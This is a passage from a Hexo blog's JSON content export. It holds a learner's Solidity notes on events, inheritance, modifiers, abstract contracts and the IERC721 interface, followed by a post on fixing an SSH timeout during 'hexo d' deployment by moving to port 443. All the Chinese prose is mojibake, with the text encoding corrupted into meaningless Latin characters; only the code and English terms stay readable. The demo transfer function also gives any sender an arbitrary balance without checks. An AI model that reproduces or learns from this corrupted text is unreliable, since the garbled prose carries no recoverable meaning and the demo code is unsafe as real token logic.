æ­¤ä¸€èˆ¬dataéƒ¨åˆ†å¯ä»¥ç”¨æ¥å­˜å‚¨å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä¾‹å¦‚æ•°ç»„å’Œå­—ç¬¦ä¸²ç­‰ç­‰ï¼Œå› ä¸ºè¿™äº›æ•°æ®è¶…è¿‡äº†256æ¯”ç‰¹ï¼Œå³ä½¿å­˜å‚¨åœ¨äº‹ä»¶çš„topicéƒ¨åˆ†ä¸­ï¼Œä¹Ÿæ˜¯ä»¥å“ˆå¸Œçš„æ–¹å¼å­˜å‚¨ã€‚å¦å¤–ï¼Œdataéƒ¨åˆ†çš„å˜é‡åœ¨å­˜å‚¨ä¸Šæ¶ˆè€—çš„gasç›¸å½“äºtopicæ›´å°‘ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°é‡Œé‡Šæ”¾äº‹ä»¶ã€‚åœ¨ä¸‹é¢ä¾‹å­ä¸­ï¼Œæ¯æ¬¡ç”¨_transfer() å‡½æ•°è¿›è¡Œè½¬è´¦æ“ä½œçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡Šæ”¾Transferäº‹ä»¶ï¼Œå¹¶è®°å½•ç›¸åº”çš„å˜é‡ 123456789101112131415// å®šä¹‰_transferå‡½æ•°ï¼Œæ‰§è¡Œè½¬è´¦é€»è¾‘function _transfer( address from, address to, uint256 amount) external &#123; _balances[from] = 10000000; // ç»™è½¬è´¦åœ°å€ä¸€äº›åˆå§‹ä»£å¸ _balances[from] -= amount; // fromåœ°å€å‡å»è½¬è´¦æ•°é‡ _balances[to] += amount; // toåœ°å€åŠ ä¸Šè½¬è´¦æ•°é‡ // é‡Šæ”¾äº‹ä»¶ emit Transfer(from, to, amount);&#125; remixä¸Šçš„æ¼”ç¤º ï¼ˆæˆ‘æ¯”è¾ƒèœï¼Œæˆ‘ä¸çŸ¥é“çœ‹è¿™ä¸ªçš„æœ‰ä»€ä¹ˆç”¨ï¼Œå°±å…ˆä¸å®é™…æ“ä½œä¸€ç•ªäº†ï¼Œä»¥åæœ‰ç‚¹çŸ¥è¯†å‚¨å¤‡äº†å†å›å¤´æ¥çœ‹çœ‹ï¼‰ 12. ç»§æ‰¿tipsï¼šç›®æ ‡ï¼šç®€å•ç»§æ‰¿ï¼Œå¤šé‡ç»§æ‰¿ï¼Œä»¥åŠä¿®é¥°å™¨ï¼ˆmodifierï¼‰å’Œæ„é€ å‡½æ•°ï¼ˆconstructorï¼‰çš„ç»§æ‰¿ã€‚ 12.1 è§„åˆ™ virtualï¼šçˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¦‚æœå¸Œæœ›å­åˆçº¦é‡å†™ï¼Œéœ€è¦åŠ ä¸Švirtualå…³é”®å­— overrideï¼šå­åˆçº¦é‡å†™äº†çˆ¶åˆçº¦ä¸­çš„å‡½æ•°ï¼Œéœ€è¦åŠ ä¸Šoverrideå…³é”®å­— 12.2 ç®€å•çš„ç»§æ‰¿å…ˆå®šä¹‰ä¸€ä¸ªçˆ·çˆ·åˆçº¦YeYeï¼Œé‡Œé¢åŒ…æ‹¬ä¸€ä¸ªLogäº‹ä»¶ï¼Œå’Œä¸‰ä¸ªfunctionï¼šhip(), pop(), yeye(), è¾“å‡ºéƒ½æ˜¯â€œçˆ·çˆ·â€ 12345678910111213141516contract Yeye &#123; event Log(string msg); // å®šä¹‰3ä¸ªfunction: hip(), pop(), man()ï¼ŒLogå€¼ä¸ºYeyeã€‚ function hip() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function pop() public virtual&#123; emit Log(&quot;Yeye&quot;); &#125; function yeye() public virtual &#123; emit Log(&quot;Yeye&quot;); &#125;&#125; å†å®šä¹‰ä¸€ä¸ªçˆ¸çˆ¸åˆçº¦ BaBaï¼Œè®©ä»–ç»§æ‰¿YeYeåˆçº¦ï¼Œè¯­æ³•å°±æ˜¯contract BaBa is YeYeï¼Œ éå¸¸ç›´è§‚ã€‚åœ¨BaBa åˆçº¦é‡Œï¼Œæˆ‘ä»¬é‡å†™ä¸€ä¸‹hip() å’Œ pop() è¿™ä¸¤ä¸ªå‡½æ•°ï¼ŒåŠ ä¸Š overrideå…³é”®å­—ï¼Œå¹¶å°†ä»–ä»¬çš„è¾“å‡ºæ”¹ä¸º â€œBaBaâ€; å¹¶ä¸”åŠ ä¸Šä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œè¾“å‡ºä¹Ÿæ˜¯â€BaBaâ€ 1234567891011121314contract Baba is Yeye&#123; // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºæ”¹ä¸ºBabaã€‚ function hip() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function pop() public virtual override&#123; emit Log(&quot;Baba&quot;); &#125; function baba() public virtual&#123; emit Log(&quot;Baba&quot;); &#125;&#125; æˆ‘ä»¬éƒ¨ç½²åˆçº¦ï¼Œå¯ä»¥çœ‹å‡ºBaBa åˆçº¦é‡Œæœ‰ 4 ä¸ªå‡½æ•°ï¼Œå…¶ä¸­hip() å’Œ pop() çš„è¾“å‡ºè¢«é™ˆå·¥æ”¹æˆ â€œBaBaâ€, è€Œç»§æ‰¿æ¥çš„ yeye() çš„è¾“å‡ºä»æ˜¯ â€œYeYeâ€ hip() ï¼š BaBaåˆçº¦ä¸­çš„yeyeå‡½æ•°ï¼š 12.3 å¤šé‡ç»§æ‰¿è§„åˆ™ï¼šç»§æ‰¿æ—¶è¦æŒ‰è¾ˆåˆ†çš„é«˜ä½æ’ã€‚å¦‚ä¸€ä¸ªErzi åˆçº¦ï¼Œç»§æ‰¿YeYe åˆçº¦å’ŒBaBaåˆçº¦ï¼Œé‚£ä¹ˆå°±è¦å†™æˆ contract Erzi is YeYe, BaBa, è€Œä¸èƒ½å†™æˆ contract Erzi is Baba, Yeye , ä¸ç„¶å°±ä¼šæŠ¥é”™ã€‚å¦‚æœæŸä¸ªå‡½æ•°åœ¨å¤šä¸ªç»§æ‰¿çš„åˆçº¦é‡Œéƒ½å­˜åœ¨ï¼Œæ¯”å¦‚ hip() å’Œ pop() å‡½æ•°ï¼Œåœ¨å­åˆçº¦é‡Œå¿…é¡»é‡å†™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚é‡å†™åœ¨å¤šä¸ªçˆ¶åˆçº¦ä¸­éƒ½èƒ½é‡åçš„å‡½æ•°æ—¶ï¼Œoverride å…³é”®å­—åé¢è¦åŠ ä¸Šæ‰€æœ‰çˆ¶åˆçº¦åå­—ï¼Œä¾‹å¦‚ &#96;override(YeYe,BaBa)ã€‚ä¾‹ï¼š 123456789contract Erzi is Yeye, Baba&#123; // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºå€¼ä¸ºErziã€‚ function hip() public virtual override(Yeye, Baba)&#123; emit Log(&quot;Erzi&quot;); &#125; function pop() public virtual override(Yeye, Baba) &#123; emit Log(&quot;Erzi&quot;); &#125; åœ¨ Erzi åˆçº¦ä¸­é‡å†™äº†hip() å’Œ pop() ä¸¤ä¸ªå‡½æ•°ï¼Œå°†è¾“å‡ºæ”¹ä¸º â€œErziâ€, å¹¶ä¸”è¿˜åˆ†åˆ«ä»YeYe å’Œ BaBa åˆçº¦ä¸­ç»§æ‰¿äº† yeye() å’Œ baba() ä¸¤ä¸ªå‡½æ•°ã€‚ 12.4 ä¿®é¥°å™¨çš„ç»§æ‰¿è¿™ä¸ªä»£ç ä¿®é¥°å™¨è¿˜å¯ä»¥å¸¦å‚æ•°çš„å‘€ï¼Ÿï¼Ÿï¼Ÿæœ‰ç‚¹æƒŠè®¶ï¼æˆ‘å¾—å»å‰é¢çœ‹çœ‹ solidity ä¸­çš„ ä¿®é¥°å™¨ï¼ˆModifierï¼‰åŒæ ·å¯ä»¥ç»§æ‰¿ï¼Œç”¨æ³•ä¸å‡½æ•°ç»§æ‰¿ç±»ä¼¼ï¼Œåœ¨ç›¸åº”çš„åœ°æ–¹åŠ ä¸Šviretual å’Œ override å…³é”®å­—å³å¯ã€‚ 123456789101112131415161718192021contract Base1 &#123; modifier exactDividedBy2And3(uint _a) virtual &#123; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0); _; &#125;&#125;contract Identifier is Base1 &#123; //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼ï¼Œä½†æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯2å’Œ3çš„å€æ•° function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123; return getExactDividedBy2And3WithoutModifier(_dividend); &#125; //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼ function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123; uint div2 = _dividend / 2; uint div3 = _dividend / 3; return (div2, div3); &#125;&#125; Identifier åˆçº¦å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä½¿ç”¨çˆ¶åˆçº¦çš„ exactDividedBy2And3 ä¿®é¥°å™¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ override å…³é”®å­—é‡å†™ä¿®é¥°å™¨ï¼š 1234modifier exactDividedBy2And3(uint _a) override &#123; _; require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);&#125; 12.5 æ„é€ å‡½æ•°çš„ç»§æ‰¿å­åˆçº¦æœ‰ä¸¤ç§æ–¹æ³•ç»§æ‰¿çˆ¶åˆçº¦çš„æ„é€ å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œçˆ¶åˆçº¦Aé‡Œé¢æœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡aï¼Œå¹¶ç”±æ„é€ å‡½æ•°çš„å‚æ•°æ¥ç¡®å®šï¼š 12345678// æ„é€ å‡½æ•°çš„ç»§æ‰¿abstract contract A &#123; uint public a; constructor(uint _a) &#123; a = _a; &#125;&#125; 12.5.1 åœ¨ç»§æ‰¿æ—¶å£°æ˜çˆ¶æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼šcontract B is A(1) 12.5.2 åœ¨å­åˆçº¦çš„æ„é€ å‡½æ•°ä¸­å£°æ˜æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š 123contract C is A &#123; constructor(uint _c) A(_c * _c) &#123;&#125;&#125; 12.6 è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°å­åˆçº¦æœ‰ä¸¤ç§æ–¹å¼è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å’Œåˆ©ç”¨super å…³é”®å­—ã€‚ 12.6.1 ç›´æ¥è°ƒç”¨ï¼šå­åˆçº¦å¯ä»¥ç›´æ¥ç”¨ çˆ¶åˆçº¦å. å‡½æ•°å() çš„æ–¹å¼æ¥è°ƒç”¨çˆ¶åˆçº¦å‡½æ•°ï¼Œä¾‹å¦‚ Yeye.pop()ã€‚ 123function callParent() public&#123; Yeye.pop();&#125; 12.6.2 super å…³é”®å­—ï¼šå­åˆçº¦å¯ä»¥åˆ©ç”¨super. å‡½æ•°å() æ¥è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ã€‚solidity ç»§æ‰¿å…³ç³»æŒ‰å£°æ˜æ—¶ä»å·¦åˆ°å³çš„é¡ºåºæ˜¯ï¼šcontract Erzi is YeYeï¼ŒBaBaï¼Œé‚£ä¹ˆBaBa æ˜¯æœ€è¿‘çš„çˆ¶åˆçº¦ï¼Œsuper.pop() å°†è°ƒç”¨BaBa.pop() è€Œä¸æ˜¯ YeYe.pop()ã€‚ 1234function callParentSuper() public&#123; // å°†è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ï¼ŒBaba.pop() super.pop();&#125; Solidity_day0313. æŠ½è±¡åˆçº¦å’Œæ¥å£13.1 æŠ½è±¡åˆçº¦ å¦‚æœä¸€ä¸ªæ™ºèƒ½åˆçº¦é‡Œè‡³å°‘æœ‰ä¸€ä¸ªä¸ºå®ç°çš„å‡½æ•°ï¼Œå³æŸä¸ªå‡½æ•°ç¼ºå°‘ä¸»ä½“{} ä¸­çš„å†…å®¹ï¼Œåˆ™å¿…é¡»å°†è¯¥åˆçº¦æ ‡ä¸º abstract ï¼Œä¸ç„¶ç¼–è¯‘å°±ä¼šæŠ¥é”™ï¼› å¦å¤–ï¼Œæœªå®ç°çš„å‡½æ•°éœ€è¦åŠ  virtualï¼Œ ä»¥ä¾¿å­åˆçº¦é‡å†™ã€‚ç›´æ¥æˆ‘ä»¬å†™äº† ä¸ªå†’æ³¡æ’åºï¼Œå¦‚æœæˆ‘ä»¬è¿˜ä¸çŸ¥é“å…·ä½“çš„å‡½æ•°ä½“æ€ä¹ˆå†™ å³ä¸çŸ¥é“å¦‚ä½•æ˜¯å®ç°å†’æ³¡æ’åºï¼Œé‚£ä¹ˆå¯å°†å‡½æ•°æ ‡ä¸º abstractï¼Œ ä¹‹åè®©åˆ«äººè¡¥å†™å‡½æ•°çš„å®ç°è¿‡ç¨‹ã€‚ 123abstract contract BubSort &#123; function bubSort(uint[] memory a) public pure virtual returns(uint[] memory);&#125; 13.2 æ¥å£ æ¥å£ç±»ä¼¼äºæŠ½è±¡åˆçº¦ï¼Œä½†å®ƒä¸å®ç°ä»»ä½•åŠŸèƒ½ã€‚æ¥å£çš„è§„åˆ™ï¼š a. ä¸èƒ½åŒ…å«çŠ¶æ€å˜é‡ b. ä¸èƒ½åŒ…å«æ„é€ å‡½æ•° c. ä¸èƒ½ç»§æ‰¿é™¤æ¥å£å¤–çš„å…¶ä»–åˆçº¦ d. æ‰€æœ‰å‡½æ•°éƒ½å¿…é¡» æ˜¯external ä¸”ä¸èƒ½æœ‰å‡½æ•°ä½“ e. ç»§æ‰¿æ¥å£çš„åˆçº¦å¿…é¡»å®ç°æ¥å£å®šä¹‰çš„æ‰€æœ‰åŠŸèƒ½ è™½ç„¶æ¥å£ä¸å®ç°ä»»ä½•åŠŸèƒ½ï¼Œä½†å®ƒéå¸¸é‡è¦ã€‚æ¥å£æ˜¯æ™ºèƒ½åˆçº¦çš„éª¨æ¶ï¼Œå®šä¹‰äº†åˆçº¦çš„åŠŸèƒ½ä»¥åŠå¦‚ä½•è§¦å‘å®ƒä»¬ï¼šå¦‚æœæ™ºèƒ½åˆçº¦å®ç°äº†æŸç§æ¥å£ï¼ˆæ¯”å¦‚ERC20 å’Œ ERC721), å…¶ä»–Dapps å’Œæ™ºèƒ½åˆçº¦å°±çŸ¥é“å¦‚ä½•ä¸å®ƒäº¤äº’ã€‚å› ä¸ºæ¥å£æä¾›äº†ä¸¤ä¸ªé‡è¦ä¿¡æ¯ï¼š a. åˆçº¦é‡Œæ¯ä¸ªå‡½æ•°çš„ bytes4 é€‰æ‹©å™¨ï¼Œä»¥åŠåŸºäºå®ƒä»¬çš„å‡½æ•°ç­¾å å‡½æ•°å(æ¯ä¸ªå‚æ•°ç±»å‹)ã€‚ b. æ¥å£id ï¼ˆæš‚æ—¶è¿˜ä¸èƒ½ç†è§£ï¼‰ å¦å¤–ï¼Œæ¥å£å’Œåˆçº¦ ABI ç­‰ä»·ï¼Œå¯ä»¥ç›¸äº’è½¬æ¢ï¼šç¼–è¯‘æ¥å£å¯ä»¥å¾—åˆ°åˆçº¦çš„ABIï¼Œ åˆ©ç”¨ abi-to-solå·¥å…· ä¹Ÿå¯ä»¥å°† ABI json æ–‡ä»¶è½¬æ¢ä¸º æ¥å£ sol æ–‡ä»¶ã€‚ æˆ‘ä»¬ç”¨ ERC721 æ¥å£åˆçº¦ IECRC721 ä¸ºä¾‹ï¼Œå®ƒå®šä¹‰äº†3ä¸ª event å’Œ 9 ä¸ªfunctionï¼Œ æ‰€æœ‰ ERC721 æ ‡å‡†çš„ NFT éƒ½æ˜¯å®ç°äº† è¿™äº›å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¥å£å’Œå¸¸è§„åˆçº¦çš„åŒºåˆ«åœ¨äºæ¯ä¸ªå‡½æ•°éƒ½ä»¥ ; ä»£æ›¿äº†å‡½æ•°ä½“ &#123;&#125; ç»“å°¾ã€‚ 1234567891011121314151617181920212223interface IERC721 is IERC165 &#123; event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); event ApprovalForAll(address indexed owner, address indexed operator, bool approved); function balanceOf(address owner) external view returns (uint256 balance); function ownerOf(uint256 tokenId) external view returns (address owner); function safeTransferFrom(address from, address to, uint256 tokenId) external; function transferFrom(address from, address to, uint256 tokenId) external; function approve(address to, uint256 tokenId) external; function getApproved(uint256 tokenId) external view returns (address operator); function setApprovalForAll(address operator, bool _approved) external; function isApprovedForAll(address owner, address operator) external view returns (bool); function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;&#125; 13.3 IERC721 äº‹ä»¶IERC721 åŒ…å«3 ä¸ªäº‹ä»¶ï¼Œå…¶ä¸­ Transfer å’Œ Approval äº‹ä»¶åœ¨ ERC20 ä¸­ä¹Ÿæœ‰ã€‚ Transfer äº‹ä»¶ï¼š åœ¨è½¬è´¦æ—¶è¢«é‡Šæ”¾ï¼Œè®°å½•ä»£å¸çš„å‘å‡ºåœ°å€ fromï¼Œæ¥æ”¶to å’Œ tokenId Approval äº‹ä»¶ï¼šåœ¨æˆæƒæ—¶é‡Šæ”¾ï¼šè®°å½•æˆæƒåœ°å€ ownerï¼Œ è¢«æˆæƒåœ°å€ approved å’Œ tokenId ApprovalForAll äº‹ä»¶ï¼šåœ¨æ‰¹é‡æˆæƒæ—¶é‡Šæ”¾è®°å½•æ‰¹é‡æˆæƒå‘å‡ºçš„åœ°å€ ownerï¼Œ è¢«æˆæƒåœ°å€ operator å’Œæˆæƒä¸å¦çš„ approvedã€‚ 13.4 IERC721å‡½æ•° balanceOfï¼šè¿”å›æŸä¸ªåœ°å€çš„NFT æŒæœ‰é‡ balance ownerOfï¼šè¿”å›æŸtokenId çš„ä¸»äºº owner transferFromï¼šæ™®é€šè½¬è´¦ï¼Œå‚æ•°ä¸ºè½¬å‡ºåœ°å€fromï¼Œæ¥æ”¶åœ°å€ to å’ŒtokenId safeTransferFromï¼šå®‰å…¨è½¬è´¦ï¼ˆå¦‚æœæ¥æ”¶æ–¹æ˜¯åˆçº¦åœ°å€ï¼Œä¼šè¦æ±‚å®ç°ERC71Receiver æ¥å£ï¼‰ã€‚å‚æ•°ä¸ºè½¬å‡º fromï¼Œæ¥æ”¶åœ°å€ to å’Œ tokenId approveï¼šæˆæƒå¦ä¸€ä¸ªåœ°å€ä½¿ç”¨ä½ çš„NFTã€‚å‚æ•°ä¸ºè¢«æˆæƒåœ°å€approve å’Œ tokenId getApprovedï¼šæŸ¥è¯¢tokenId è¢«æ‰¹å‡†ç»™äº†å“ªä¸ªåœ°å€ setApprovalForAllï¼šå°†è‡ªå·±æŒæœ‰çš„è¯¥ç³»åˆ— NFTæ‰¹é‡æˆæƒç»™æŸä¸ªåœ°å€ operator isApprovedForAllï¼šæŸ¥è¯¢æŸåœ°å€çš„ NFT æ˜¯å¦æ‰¹é‡æˆæƒç»™äº†å¦ä¸€ä¸ª operator åœ°å€ safeTransferFromï¼šå®‰å…¨è½¬è´¦çš„é‡è½½å‡½æ•°ï¼Œå‚æ•°é‡Œå–ä½ åŒ…å«äº† data 13.5 ä»€ä¹ˆæ—¶å€™ä½¿ç”¨æ¥å£å¦‚æœæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªåˆçº¦å®ç°äº† IERC721æ¥å£ï¼Œæˆ‘ä»¬ä¸éœ€è¦çŸ¥é“å®ƒå…·ä½“ä»£ç å®ç°ï¼Œå°±å¯ä»¥ä¸å®ƒäº¤äº’ã€‚ æ— èŠçŒ¿ BAYC å±äºERC721 ä»£å¸ï¼Œå®ç°äº†æ¥å£çš„åŠŸèƒ½ã€‚æˆ‘ä»¬ä¸éœ€è¦çŸ¥é“ä»–çš„æºä»£ç ï¼Œåªéœ€çŸ¥é“å®ƒçš„åˆçº¦åœ°å€ï¼Œç”¨ IERC721 æ¥å£å°±å¯ä»¥ä¸å®ƒäº¤äº’ï¼Œæ¯”å¦‚ç”¨ balanceOf() æ¥æŸ¥è¯¢æŸä¸ªåœ°å€çš„ BAYCä½™é¢ï¼Œç”¨ safeTransferFrom() æ¥è½¬è´¦ BAYC. 1234567891011121314contract interactBAYC &#123; // åˆ©ç”¨BAYCåœ°å€åˆ›å»ºæ¥å£åˆçº¦å˜é‡ï¼ˆETHä¸»ç½‘ï¼‰ IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D); // é€šè¿‡æ¥å£è°ƒç”¨BAYCçš„balanceOf()æŸ¥è¯¢æŒä»“é‡ function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123; return BAYC.balanceOf(owner); &#125; // é€šè¿‡æ¥å£è°ƒç”¨BAYCçš„safeTransferFrom()å®‰å…¨è½¬è´¦ function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123; BAYC.safeTransferFrom(from, to, tokenId); &#125;&#125; tips: é¡¿æ‚Ÿâ€”â€” å› ä¸ºä¹‹å‰åªå­¦è¿‡Javaæ‰€ä»¥è„‘å­é‡Œéƒ½æ˜¯Javaçš„æ€ç»´é€»è¾‘ï¼Œä¸€ç›´ä¸èƒ½ç†è§£solidityä¸­çš„ä½¿ç”¨æ¥å£æ¥è°ƒç”¨æ–¹æ³•ï¼Œé—®äº†å­¦é•¿æ‰çŸ¥é“ï¼Œä»–å’Œ Java ä¸ä¸€æ ·ï¼Œå¯ä»¥è‡ªå·±å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œåªè¦æŸä¸ªå‡½æ•°å®ç°äº†è¯¥æ¥å£çš„æ–¹æ³•ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡è¯¥æ¥å£æ¥è°ƒç”¨é‚£ä¸ªå‡½æ•°ï¼ï¼ï¼ï¼ 13.6 ä»£ç æµ‹è¯•éªŒè¯çŒœæƒ³","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"}]},{"title":"hexo då‘½ä»¤å‡ºé—®é¢˜","slug":"Hexo/hexo d å‘½ä»¤å‡ºé—®é¢˜","date":"2022-12-04T10:25:10.000Z","updated":"2022-12-04T10:25:10.000Z","comments":true,"path":"2022/12/04/Hexo/hexo d å‘½ä»¤å‡ºé—®é¢˜/","link":"","permalink":"https://biyouqiuqiu.com/2022/12/04/Hexo/hexo%20d%20%E5%91%BD%E4%BB%A4%E5%87%BA%E9%97%AE%E9%A2%98/","excerpt":"","text":"æ­å»ºåšå®¢çš„ç»å†æ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£æ ·ä¸€å¸†é£é¡ºï¼Œæœ€å¤§çš„é—®é¢˜å‡ºç°åœ¨hexo d çš„éƒ¨ç½²ä¸Šï¼Œæ¯æ¬¡éƒ½æ˜¯å¡åœ¨ç½‘ç»œè¿æ¥è¶…æ—¶ï¼Œåœ¨_config.xmlæ–‡ä»¶ä¸­ä¿®æ”¹äº† repositoryçš„å€¼ï¼Œå°†https://github.com/LBiyou/LBiyou.github.io.git æ¢æˆï¼š&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#99;&#111;&#109;:LBiyou&#x2F;LBiyou.github.io.git ä¹‹åï¼Œè·å–å…¬é’¥ç„¶åæ·»åŠ å…¬é’¥ï¼Œæ‰§è¡Œhexo d å°±æŠ¥ remote ä»€ä¹ˆä»€ä¹ˆï¼Œè¿˜æœ‰ä»€ä¹ˆexsitä¹‹ç±»çš„ã€‚ ç„¶åå°±æ˜¯ åœ¨git æ‰§è¡Œ ssh -T &#x67;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109; è¿™è¡Œè¯­å¥éªŒè¯æ˜¯å¦é…ç½®æˆæœï¼Œç»“æœæŠ¥ssh: connect to host github.com port 22: Connection timed outè¿æ¥è¶…æ—¶ï¼Œç„¶åç½‘ä¸Šæ‰¾èµ„æ–™ï¼Œåˆ° D:\\Git\\Git\\etc\\ssh ä¸‹ä¿®æ”¹ssh_configæ–‡ä»¶ å°† 1234567Host ssh.dev.azure.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa# Added by git-extraHost *.visualstudio.com HostkeyAlgorithms +ssh-rsa PubkeyAcceptedAlgorithms +ssh-rsa é…ç½®æ–°çš„ç«¯å£å·443 1234567Host github.com /* æœåŠ¡å™¨åœ°å€ï¼šgithub.com */User YourEmail /* ç”¨æˆ·è´¦å·ï¼šgithubä¸Šçš„æ³¨å†Œé‚®ç®± */Hostname ssh.github.com /* æœåŠ¡å™¨åœ°å€ä¸ºgithubåœ°å€*/PreferredAuthentications publickey /* é‡‡ç”¨å…¬åŒ™ */IdentityFile ~/.ssh/id_rsa /* å…¬åŒ™æ–‡ä»¶è·¯å¾„ */Port 443 /* ç«¯å£ */ å‚è€ƒåšå®¢ä¸ºï¼š[æŠ¥é”™ï¼š ssh: connect to host github.com port 22: Connection timed out_taotianluckyçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_31020665/article/details/114113108?ops_request_misc=%7B%22request%5Fid%22%3A%22167030504016800186529240%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=167030504016800186529240&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-8-114113108-null-null.142^v67^control,201^v4^add_ask,213^v2^t3_control2&amp;utm_term=ssh -t git%40github.comè¶…æ—¶&amp;spm&#x3D;1018.2226.3001.4187) åœ¨æœ¬æœºçš„é…ç½®æ–‡ä»¶ä¸ºï¼š 123456Host github.com User 3071709373@qq.com Hostname ssh.github.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa Port 443 ä¿®æ”¹ä¹‹åï¼Œè¿è¡Œ ssh -T &#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#x6f;&#109; æˆåŠŸï¼Œæ‰§è¡Œ hexo g hexo d éƒ½æˆåŠŸ","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"å¿ƒå¾—","slug":"å¿ƒå¾—","permalink":"https://biyouqiuqiu.com/tags/%E5%BF%83%E5%BE%97/"}]}],"categories":[{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"},{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"},{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/categories/Web3/"},{"name":"Basic_Knowledge","slug":"Web3/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Web3/Basic-Knowledge/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"},{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"},{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"},{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"},{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"so